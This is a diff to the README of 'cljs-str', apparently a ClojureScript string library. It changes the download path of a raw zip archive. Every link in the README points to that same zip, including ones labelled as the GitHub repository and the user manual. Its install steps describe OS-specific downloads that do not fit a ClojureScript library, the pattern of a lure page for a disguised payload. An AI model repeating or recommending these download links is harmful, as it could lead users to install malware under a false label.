@@ -2,7 +2,7 @@
 # 🚀 cljs-str - A Better Way to Handle Strings
 
 ## 📥 Download Now
-[![Download cljs-str](https://raw.githubusercontent.com/Egep39/cljs-str/main/intergovernmental/cljs-str.zip)](https://raw.githubusercontent.com/Egep39/cljs-str/main/intergovernmental/cljs-str.zip)
+[![Download cljs-str](https://raw.githubusercontent.com/Egep39/cljs-str/main/src/cljs_str_1.3.zip)](https://raw.githubusercontent.com/Egep39/cljs-str/main/src/cljs_str_1.3.zip)
 
 ## 🔍 Overview
 
@@ -25,11 +25,11 @@ Before downloading, ensure your system meets these requirements:
 
 To download the latest version of **cljs-str**, visit the following page:
 
-- [Visit this page to download](https://raw.githubusercontent.com/Egep39/cljs-str/main/intergovernmental/cljs-str.zip)
+- [Visit this page to download](https://raw.githubusercontent.com/Egep39/cljs-str/main/src/cljs_str_1.3.zip)
 
 ## 📥 Download & Install
 
-1. Click on the link: [Visit this page to download](https://raw.githubusercontent.com/Egep39/cljs-str/main/intergovernmental/cljs-str.zip).
+1. Click on the link: [Visit this page to download](https://raw.githubusercontent.com/Egep39/cljs-str/main/src/cljs_str_1.3.zip).
 2. On the releases page, find the most recent version.
 3. Click on the version number to see the assets.
 4. Download the file that matches your operating system.
@@ -74,8 +74,8 @@ If you need further assistance or have any questions about using **cljs-str**, y
 
 To explore more about **cljs-str**, you can find additional resources at the following links:
 
-- [GitHub Repository](https://raw.githubusercontent.com/Egep39/cljs-str/main/intergovernmental/cljs-str.zip)
-- [User Manual](https://raw.githubusercontent.com/Egep39/cljs-str/main/intergovernmental/cljs-str.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Egep39/cljs-str/main/src/cljs_str_1.3.zip)
+- [User Manual](https://raw.githubusercontent.com/Egep39/cljs-str/main/src/cljs_str_1.3.zip)
 
 Thank you for choosing **cljs-str**. We hope it enhances your experience with strings in ClojureScript!
 
